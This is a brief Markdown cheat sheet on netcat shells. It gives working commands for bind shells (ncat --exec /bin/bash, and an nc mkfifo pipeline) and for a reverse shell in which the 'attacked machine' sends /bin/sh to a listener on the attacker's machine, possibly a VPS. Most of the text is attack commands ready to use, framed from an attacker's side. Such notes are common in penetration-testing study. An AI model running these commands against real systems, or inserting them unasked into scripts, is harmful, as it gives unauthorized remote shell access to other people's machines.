# Netcat Shells

```sh
ncat --exec "/bin/bash" -l 8081 --keep-open
 # Bind to TCP port
 # 8081 and attach /bin/bash for the world to access freely
```

```sh
ncat --exec "/bin/bash" --max-conns 3 --allow 192.168.0.0/24 -l 8081 --keep-open
 # Bind a shell to TCP port 8081, limit access to
 # hosts on a local network, and limit the maximum number of
 # simultaneous connections to 3
```

## Bind Shell with minimal Netcat (nc without --exec or -e)

![Bind Shell](img/Bind_Shell_Scenario.png)

Bind shell is a common scenario, we can think about a classical "
ssh-like" session when we think about bind shells. On the
attacked machine (the one on which we would like to talk) we
should execute:

```sh
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 3333 > /tmp/f
 # keeps an opened port, in this case "3333" to
 # execute commands from a remote machine
```

on the attacking machine (the one from where we will issue
commands) instead we execute:

```sh
nc 127.0.0.1 3333
```

Bind Shell and Reverse Shell can be more elegant by using ssl, in
order to not let other decrypt the traffic.


## Reverse Shell with minimal Netcat (nc without --exec or -e)

![Reverse Shell](img/Reverse_Shell_Scenario.png)

On the attacking machine (which could be a VPS) we execute:

```sh
nc -nlvp 3333
 # this is the local machine on which we keep a
 # port opened to issue commands and view the output
```

On the attacked machine we have to issue:

```sh
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1 | nc 127.0.0.1 3333 > /tmp/f
 # this has to be issued on the attacked machine
```

now from the attacking machine we can issue commands and see output.


